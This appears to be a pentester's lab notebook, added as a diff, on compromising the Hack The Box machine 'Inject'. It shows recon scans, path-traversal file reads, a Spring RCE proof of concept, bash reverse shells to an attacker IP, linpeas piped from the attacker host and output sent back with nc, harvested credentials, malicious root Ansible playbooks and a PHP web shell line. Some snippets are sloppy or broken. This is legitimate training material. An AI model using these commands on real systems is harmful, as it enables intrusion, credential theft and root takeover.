@@ -1,0 +1,678 @@
+2023-04-12 19:15:42 CDT -- START TIME
+
+### Inject ###
+----------------------------------------
+|================================================================
+- Name: inject
+- IP Address: 10.10.11.204
+- OS: "Ubuntu 20.04.5 LTS" x64
+- Notes: 
+
+//CREDS:
+//	phil:DocPhillovestoInject123
+
+
+//Flags:
+#User: 		878307b5d29fdc74fffcd96f4786402e
+#System:
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+2023-04-12 19:18:48 CDT -- 
+ip=10.10.11.204
+ports=$(nmap -e tun0 -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+
+echo $ports
+//22,8080,52114
+
+2023-04-12 19:21:24 CDT -- 
+nmap -Pn -A -p$ports $ip -oN tcp.nmap
+
+PORT      STATE  SERVICE     VERSION
+22/tcp    open   ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
+|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
+|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
+8080/tcp  open   nagios-nsca Nagios NSCA
+|_http-title: Home
+52114/tcp closed unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+# UDP scan
+2023-04-12 19:23:56 CDT -- 
+sudo nmap -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//BURP
+http://10.10.11.204:8080
+
+
+-- feroxbuster --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-12 19:33:47 CDT -- 
+# feroxbuster use (-k = Disable TLS verification; -e = do directory listing when possible; -q = quiet)
+feroxbuster -u http://10.10.11.204:8080 -k -o feroxbuster.out
+
+200  http://10.10.11.204:8080/register
+200  http://10.10.11.204:8080/upload
+200  http://10.10.11.204:8080/blogs
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// gobuster --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Just to confirm feroxbuster, still learning
+2023-04-12 19:43:39 CDT -- 
+// directory brute force
+gobuster dir -u http://10.10.11.204:8080/ -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,htm -o gobuster-80.txt
+
+//NO change from feroxbuster. Goood to know!
+
+// vhost brute force
+// Need Domain name
+gobuster vhost -u 10.10.11.204 -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt --append-domain
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// nikto -- 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-12 20:59:37 CDT -- 
+// scan website
+nikto -h http://10.10.11.204:8080/ -o nikto_scan.txt
+
+//Nothing of interest
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Testing Page Upload function
+// http://10.10.11.204:8080/upload
+// SUCCESS
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+echo 'THIS is a test' > test.txt
+
+//Tried test.txt Upload
+Only image files are accepted!
+
+//Try "image" file Upload
+mv test.txt test.png
+
+//Success on upload, got an interesting URL
+curl -k 
+http://10.10.11.204:8080/show_image?img=test.png
+
+THIS is a test
+
+//SUCCESS
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// LFI Test (Burp/curl)
+// SUCCESS
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+http://10.10.11.204:8080/show_image?img=../../../../../../../../etc/passwd
+
+//SUCCESS in Burp, trying curl
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+frank:x:1000:1000:frank:/home/frank:/bin/bash
+phil:x:1001:1001::/home/phil:/bin/bash
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// RFI Test (Burp/curl)
+// FAIL
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+echo 'THIS is a test' > test.txt
+
+2023-04-12 20:44:38 CDT -- 
+curl -k http://10.10.11.204:8080/show_image?img=http://10.10.16.7:443/test.txt
+
+//FAIL, did get a file path.
+{"timestamp":"2023-04-14T22:22:00.291+00:00","status":500,"error":"Internal Server Error","message":"URL [file:/var/www/WebApp/src/main/uploads/http:/10.10.16.7:443/test.txt] cannot be resolved in the file system for checking its content length","path":"/show_image"}
+
+//file:/var/www/WebApp/src/main/uploads/http:/10.10.16.7:443/test.txt
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- wfuzz --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Get a good LFI wordlist
+wget https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists/file_inclusion_linux.txt
+
+2023-04-12 21:03:33 CDT -- 
+# wfuzz
+wfuzz -c -w ./file_inclusion_linux.txt --hw 0 -u http://10.10.11.204:8080/show_image?img=FUZZ > wfuzz.out
+
+//Found
+less -r wfuzz.out | egrep -A1 200 > wfuzz.filtered
+/proc/self/environ
+/etc/passwd
+/etc/group
+
+2023-04-12 21:28:33 CDT -- 
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../../proc/self/environ > environ
+
+2023-04-12 21:28:59 CDT -- 
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../../etc/group > group
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Fucking with LFI
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Because this certain vuln, directories are able to be enumerated.
+//THIS IS NOT NORMAL
+
+2023-04-12 23:41:21 CDT -- 
+//Check root directory
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../
+
+//SUCCESS, shows full / directory
+
+2023-04-12 23:42:33 CDT -- 
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../../home
+frank
+phil
+
+2023-04-12 23:44:44 CDT -- 
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../../home/frank
+.bash_history
+.bashrc
+.cache
+.local
+.m2
+.profile
+
+2023-04-12 23:44:49 CDT -- 
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../../home/phil
+.bash_history
+.bashrc
+.cache
+.profile
+user.txt
+
+//PHIL has user.txt
+
+2023-04-12 23:46:12 CDT -- 
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../../var
+
+backups
+cache
+crash
+lib
+local
+lock
+log
+mail
+opt
+run
+spool
+tmp
+www
+
+2023-04-12 23:47:11 CDT -- 
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../../var/www
+html
+
+html
+WebApp
+
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../../var/www/html
+//Nothing
+
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../../var/www/WebApp
+
+.classpath
+.DS_Store
+.idea
+.project
+.settings
+HELP.md
+mvnw
+mvnw.cmd
+pom.xml
+src
+target
+
+2023-04-13 00:00:29 CDT -- 
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../../var/www/WebApp/HELP.md
+
+//* [Official Apache Maven documentation](https://maven.apache.org/guides/index.html)
+//* [Spring Boot Maven Plugin Reference Guide](https://docs.spring.io/spring-boot/docs/2.6.6/maven-plugin/reference/html/)
+
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../../var/www/WebApp/mvnw
+
+//Copied the code to mvnw
+
+2023-04-13 00:28:36 CDT -- 
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../../var/www/WebApp/mvnw.cmd
+
+//Copied the code to mvnw.cmd
+
+2023-04-13 00:28:38 CDT -- 
+curl -k http://10.10.11.204:8080/show_image?img=../../../../../../../../var/www/WebApp/target
+.DS_Store
+classes
+generated-sources
+generated-test-sources
+maven-archiver
+maven-status
+spring-webapp.jar
+spring-webapp.jar.original
+surefire-reports
+test-classes
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// EXPLOIT research
+// Maven Apache, Spring-Framework
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//What is Spring? 
+//Spring is an application development framework for Java. Millions of developers worldwide use the Spring Framework to write high performing and reusable code.
+
+//The core feature of the Spring Framework is that it can be used in developing any Java application, but there are extensions for building web applications on top of Java. 
+//What is Spring4Shell? 
+//Spring4Shell (CVE-2022-22965) is a remote code execution vulnerability in Spring Framework named after the critical Log4Shell bug disclosed in 2021. Although this vulnerability exists in Spring Core, it is not as widespread as Log4Shell since some prerequisites need to be fulfilled to make the application vulnerable.
+
+//CVSSv3 score of 9.8
+//The vulnerability affects Spring Framework versions 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older unsupported versions.
+
+//Vulnerable code snippet
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+public class Greeting {
+		private long id;
+		private String content;
+		public long getId() {
+	 			return id;
+		}
+		public String getContent() { 
+			return content;
+		}
+}
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Exploiting Spring4Shell
+//reznok/Spring4Shell-POC
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Get POC
+wget https://raw.githubusercontent.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit/main/exploit.py
+
+usage: spring4shell.py [-h] [-u URL]
+
+options:
+  -h, --help         show this help message and exit
+  -u URL, --url URL  URL of the site with spring Framework, example:
+                     http://vulnerablesite.com:8080
+
+//Changed lport to 8080 in exploit
+
+2023-04-13 01:54:05 CDT -- 
+python3 ./spring4shell.py -u "http://10.10.11.204:8080"
+
+//SUCCESS
+
+id
+uid=1000(frank) gid=1000(frank) groups=1000(frank)
+
+
+//-- upgrade shell --
+//Catching 443 in another terminal
+sudo rlwrap -cAr nc -lvnp 443
+
+/bin/bash -i >& /dev/tcp/10.10.16.7/443 0>&1
+
+
+# python method
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+//SUCCESS
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// ENUM (Frank)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-04-13 02:43:46 CDT -- 
+hostname
+inject
+
+cat /etc/*lease
+"Ubuntu 20.04.5 LTS"
+
+ip a
+ inet 10.10.11.204/23 brd 10.10.11.255 scope global eth0
+
+netstat -pant
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 10.10.11.204:56564      10.10.16.3:4444         ESTABLISHED 25393/OSNaL         
+tcp        0      0 10.10.11.204:41412      10.10.16.7:4444         CLOSE_WAIT  31960/python3       
+tcp        0    139 10.10.11.204:37390      10.10.16.7:443          ESTABLISHED 35207/netstat       
+tcp        0      1 10.10.11.204:37462      8.8.8.8:53              SYN_SENT    -                   
+tcp        0      0 10.10.11.204:40918      10.10.16.7:6969         ESTABLISHED -                   
+tcp6       0      0 :::8080                 :::*                    LISTEN      819/java            
+tcp6       0      0 :::22                   :::*                    LISTEN      -       
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// privesc (frank)
+// phil:DocPhillovestoInject123
+// 878307b5d29fdc74fffcd96f4786402e
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-13 03:09:19 CDT -- 
+// install peass
+sudo apt install -y peass
+
+
+// get a copy of linpeas shell script or binary
+cp /usr/share/peass/linpeas/linpeas.sh .
+
+
+which curl
+/usr/bin/curl
+
+2023-04-13 03:13:15 CDT -- 
+// download, execute from memory, & save output on kali
+  // kali term1
+sudo python3 -m http.server 80
+  // kali term2
+nc -lvnp 443 | tee linpeas.out
+  // target
+curl 10.10.16.7:80/linpeas.sh | sh | nc 10.10.16.7 443
+
+
+//INteresting
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-3560
+Potentially Vulnerable to CVE-2022-2588
+
+╔══════════╣ Executing Linux Exploit Suggester
+[+] [CVE-2022-2586] nft_object UAF
+[+] [CVE-2021-4034] PwnKit
+[+] [CVE-2021-3156] sudo Baron Samedit
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+
+-rwsr-xr-x 1 root root 1.2M Apr 18  2022 /usr/bin/bash
+
+//Easy MODE
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/                                                                                                                                                       
+/home/phil/.bash_history
+/home/phil/user.txt
+/home/frank/.bash_history
+/home/frank/.m2/settings.xml
+/root/
+
+╔══════════╣ Readable files belonging to root and readable by me but not world readable
+-rw-r----- 1 root frank 617 Jan 31 16:55 /home/frank/.m2/settings.xml
+
+cat settings.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
+  <servers>
+    <server>
+      <id>Inject</id>
+      <username>phil</username>
+      <password>DocPhillovestoInject123</password>
+      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
+      <filePermissions>660</filePermissions>
+      <directoryPermissions>660</directoryPermissions>
+      <configuration></configuration>
+    </server>
+  </servers>
+</settings>
+
+//CREDS:
+//phil:DocPhillovestoInject123
+
+2023-04-13 03:38:22 CDT -- 
+su - phil
+
+id
+uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
+
+//SUCCESS
+
+cat user.txt                  
+//878307b5d29fdc74fffcd96f4786402e
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// privesc (phil)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+sudo -ll
+//Don't know passwd
+
+
+2023-04-13 03:49:52 CDT -- 
+// download, execute from memory, & save output on kali
+  // kali term1
+sudo python3 -m http.server 80
+  // kali term2
+nc -lvnp 443 | tee linpeas.out
+  // target
+curl 10.10.16.7:80/linpeas.sh | sh | nc 10.10.16.7 443
+
+
+//INteresting
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-3560
+Potentially Vulnerable to CVE-2022-2588
+
+╔══════════╣ Executing Linux Exploit Suggester
+[+] [CVE-2022-2586] nft_object UAF
+[+] [CVE-2021-4034] PwnKit
+[+] [CVE-2021-3156] sudo Baron Samedit
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+
+
+//INerteresting
+-rwxr-xr-x 1 frank frank  250 Apr 15 02:03 /tmp/OSNaL
+-rwsr-xr-x 1 root root 1.2M Apr 18  2022 /usr/bin/bash
+
+══╣ Some home ssh config file was found
+/usr/share/openssh/sshd_config
+
+//Phil is in the staff group
+id
+uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
+
+
+find / -xdev -group staff 2>/dev/null
+
+//Owned by staff group
+2023-04-13 04:23:46 CDT -- 
+ls -lah /root
+drwx------   6 root staff 4.0K Mar  6 13:15 root
+
+ls -lah /opt/automation/tasks
+total 12K
+drwxrwxr-x 2 root staff 4.0K Apr 15 05:58 .
+drwxr-xr-x 3 root root  4.0K Oct 20 04:23 ..
+-rw-r--r-- 1 root root   150 Apr 15 05:58 playbook_1.yml
+
+2023-04-13 04:24:49 CDT -- 
+cat /opt/automation/tasks/playbook_1.yml
+- hosts: localhost
+  tasks:
+  - name: Checking webapp service
+    ansible.builtin.systemd:
+      name: webapp
+      enabled: yes
+      state: started
+
+
+// pspy
+// pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// get a copy of pspy
+// download pspy64
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+
+// upload to target
+sudo python3 -m http.server 80
+wget http://10.10.16.7:80/pspy64
+
+// execute pspy
+chmod +x pspy64
+
+2023-04-13 04:44:17 CDT -- 
+./pspy64
+
+
+//Of interest
+/usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml 
+/bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
+/bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
+
+
+//Have write access to (/opt/automation/tasks), root runs playbook_1.yml 
+// It cleans up the /opt/automation/tasks directory when it is done
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//Create my own playbook ANSIBLE to run as root
+// https://gtfobins.github.io/gtfobins/ansible-playbook/
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-15 02:51:57 CDT -- 
+hak=$(touch letmein.yml)
+echo '[{hosts: localhost, tasks: [shell: /bin/bash -i >& /dev/tcp/10.10.16.7/443 0>&1]}]' > $hak
+sudo ansible-playbook $TF
+
+// Download file to edit it
+
+//EDIT file
+- hosts: localhost
+  tasks: 
+  - name: LETMEIN
+    [shell: bash -c 'bash -i >& /dev/tcp/10.10.16.7/443 0>&1']
+	become: true
+
+- hosts: localhost
+  connection: local
+  tasks:
+    - name: "LET_ME_IN"
+      shell: "bash -c 'bash -i >& /dev/tcp/10.10.16.7/443 0>&1'"
+      become: true
+
+
+- hosts: localhost
+  connection: local
+  tasks:
+    - name: "LET_ME_IN"
+      shell: "cp /bin/bash /tmp/clippy2/bash && chmod +s /tmp/clippy2/bash"
+      become: tru
+
+//Set Temp directory
+TF=$(mktemp)
+
+- name: "LET_ME_IN"
+  hosts: localhost
+  connection: local
+  tasks:
+    - name: "LET_ME_IN"
+      shell: "cp /bin/bash $TF && chmod +s $TF"
+      become: true
+
+//Start Listener
+sudo python3 -m http.server 80
+
+//UPload file
+wget http://10.10.16.7:80/letmein.yml
+
+//WAIT
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+
+
+
+// MISC
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// ../../../../../../../var/www/WebApp/src/main/uploads 
+
+curl -k http://10.10.11.204:8080/show_image?page=php://filter/convert.base64-encode/resource=config
+
+<?php system($_GET[cmd]); ?>
+http://10.10.11.204:8080/show_image?img=zip://command.zip%23shell&cmd=whoami`
+
+../../../../../../../var/www/WebApp/src/main/uploads
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
